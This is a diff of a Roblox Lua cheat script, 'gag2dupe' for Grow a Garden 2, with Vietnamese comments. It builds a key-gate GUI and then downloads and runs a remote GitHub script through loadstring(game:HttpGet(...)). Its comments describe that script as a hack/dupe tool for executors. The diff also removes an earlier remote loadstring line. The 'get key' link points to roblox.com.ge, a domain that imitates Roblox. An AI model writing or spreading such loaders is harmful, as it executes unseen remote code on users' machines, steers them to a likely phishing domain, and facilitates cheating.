@@ -1,37 +1,40 @@
-_G.gag2dupe = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/daucobonhi/Ui-Redz-V2/refs/heads/main/Uihoangv1.lua"))()
 --[[
-    SCRIPT: gag2dupe (Key System cho Grow a Garden 2)
-    Hướng dẫn: Sửa link Get Key và Key chính xác ở dưới, sau đó chia sẻ code này cho người dùng.
+    SCRIPT CHUẨN: gag2dupe (Grow a Garden 2)
+    Đã sửa lỗi bị đè lệnh loadstring ở đầu.
 --]]
 
 local Players = game:GetService("Players")
-local MarketPlaceService = game:GetService("MarketplaceService")
+local LocalPlayer = Players.LocalPlayer
 local Clipboard = setclipboard or toclipboard
 
 -- ==================== CẤU HÌNH HỆ THỐNG KEY ====================
-local LINK_GET_KEY = "https://roblox.com.ge/communities/8754684311/" -- Thay link vượt tiền của bạn vào đây
-local KEY_CHINH_XAC = "Key_gag2" -- Thay Key bạn muốn đặt vào đây
+local LINK_GET_KEY = "https://roblox.com.ge/communities/8754684311/" 
+local KEY_CHINH_XAC = "Key_gag2" 
 
--- Link script chính (UI Redz V2) của bạn:
+-- Link script chính trên GitHub của bạn:
 local LINK_SCRIPT_CHINH = "https://raw.githubusercontent.com/hoangvip397-coder/Tu-n-ngu/refs/heads/main/Scriptdemo.lua.txt" 
 -- ===============================================================
 
--- KIỂM TRA XEM CÓ ĐÚNG GAME GROW A GARDEN 2 KHÔNG
--- ID vũ trụ (UniverseId) hoặc PlaceId của game Grow a Garden 2
-local gamePlaceId = game.PlaceId 
-
--- Tạo UI nhập Key
+-- Khởi tạo Giao diện (UI)
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "gag2dupe_KeySystem"
-ScreenGui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
 ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
+-- Ép bảng hiện lên CoreGui để chống lỗi chặn UI của các Executor
+local successGui, errGui = pcall(function()
+    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+end)
+if not successGui then
+    ScreenGui.Parent = game:GetService("CoreGui")
+end
+
+-- Khung bảng chính
 local Frame = Instance.new("Frame")
 Frame.Name = "MainFrame"
 Frame.Size = UDim2.new(0, 360, 0, 220)
 Frame.Position = UDim2.new(0.5, -180, 0.5, -110)
-Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25) -- Nền tối gaming cực ngầu
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25) 
 Frame.BorderSizePixel = 0
 Frame.Active = true
 Frame.Draggable = true
@@ -41,16 +44,17 @@ local UICorner = Instance.new("UICorner")
 UICorner.CornerRadius = UDim.new(0, 12)
 UICorner.Parent = Frame
 
--- Tên Script gag2dupe nổi bật
+-- Tiêu đề bảng
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0, 45)
 Title.BackgroundTransparency = 1
 Title.Text = "✨ gag2dupe | GROW A GARDEN 2 ✨"
-Title.TextColor3 = Color3.fromRGB(46, 204, 113) -- Màu xanh lá hợp chủ đề khu vườn
+Title.TextColor3 = Color3.fromRGB(46, 204, 113) 
 Title.TextSize = 18
 Title.Font = Enum.Font.SourceSansBold
 Title.Parent = Frame
 
+-- Ô nhập Key
 local TextBox = Instance.new("TextBox")
 TextBox.Size = UDim2.new(0.85, 0, 0, 38)
 TextBox.Position = UDim2.new(0.075, 0, 0.3, 0)
@@ -66,6 +70,7 @@ local TextBoxCorner = Instance.new("UICorner")
 TextBoxCorner.CornerRadius = UDim.new(0, 6)
 TextBoxCorner.Parent = TextBox
 
+-- Nút Copy Link
 local CopyBtn = Instance.new("TextButton")
 CopyBtn.Size = UDim2.new(0.4, 0, 0, 38)
 CopyBtn.Position = UDim2.new(0.075, 0, 0.58, 0)
@@ -80,6 +85,7 @@ local CopyCorner = Instance.new("UICorner")
 CopyCorner.CornerRadius = UDim.new(0, 6)
 CopyCorner.Parent = CopyBtn
 
+-- Nút Check Key
 local CheckBtn = Instance.new("TextButton")
 CheckBtn.Size = UDim2.new(0.4, 0, 0, 38)
 CheckBtn.Position = UDim2.new(0.525, 0, 0.58, 0)
@@ -94,6 +100,7 @@ local CheckCorner = Instance.new("UICorner")
 CheckCorner.CornerRadius = UDim.new(0, 6)
 CheckCorner.Parent = CheckBtn
 
+-- Dòng trạng thái
 local StatusLabel = Instance.new("TextLabel")
 StatusLabel.Size = UDim2.new(1, 0, 0, 30)
 StatusLabel.Position = UDim2.new(0, 0, 0.82, 0)
@@ -104,22 +111,22 @@ StatusLabel.TextSize = 13
 StatusLabel.Font = Enum.Font.SourceSansItalic
 StatusLabel.Parent = Frame
 
--- XỬ LÝ CLICK NÚT COPY
+-- LOGIC NÚT COPY LINK
 CopyBtn.MouseButton1Click:Connect(function()
     if Clipboard then
         Clipboard(LINK_GET_KEY)
         CopyBtn.Text = "Đã sao chép!"
         StatusLabel.TextColor3 = Color3.fromRGB(52, 152, 219)
-        StatusLabel.Text = "Đã lưu link vào bộ nhớ đệm! Hãy dán vào trình duyệt web."
+        StatusLabel.Text = "Đã lưu link! Hãy dán (Paste) vào trình duyệt web."
         task.wait(2)
         CopyBtn.Text = "🔗 Copy Link"
     else
         StatusLabel.TextColor3 = Color3.fromRGB(230, 126, 34)
-        StatusLabel.Text = "Lỗi: Phần mềm hack của bạn không hỗ trợ Auto-Copy!"
+        StatusLabel.Text = "Lỗi: Executor không hỗ trợ Auto-Copy!"
     end
 end)
 
--- XỬ LÝ CLICK NÚT CHECK KEY
+-- LOGIC NÚT CHECK KEY
 CheckBtn.MouseButton1Click:Connect(function()
     local userKey = TextBox.Text
     
@@ -128,16 +135,20 @@ CheckBtn.MouseButton1Click:Connect(function()
         StatusLabel.Text = "Key chuẩn! Đang kích hoạt gag2dupe..."
         task.wait(1.5)
         
-        -- Tắt bảng nhập Key đi
-        ScreenGui:Destroy()
+        ScreenGui:Destroy() -- Xóa bảng Key
         
-        -- TỰ ĐỘNG CHẠY SCRIPT HACK/DUPE TỪ LINK GITHUB CỦA BẠN
+        -- CHẠY SCRIPT CHÍNH TỪ FILE GITHUB CỦA BẠN
         local success, err = pcall(function()
             loadstring(game:HttpGet(LINK_SCRIPT_CHINH, true))()
         end)
         
         if not success then
-            warn("Lỗi tải script chính từ GitHub: ", err)
+            -- Nếu script trên GitHub bị lỗi code, nó sẽ hiện thông báo lỗi thẳng lên màn hình
+            local ErrorGui = Instance.new("ScreenGui")
+            ErrorGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+            local Message = Instance.new("Message")
+            Message.Text = "Lỗi chạy code từ GitHub: " .. tostring(err)
+            Message.Parent = ErrorGui
         end
     else
         StatusLabel.TextColor3 = Color3.fromRGB(231, 76, 60)
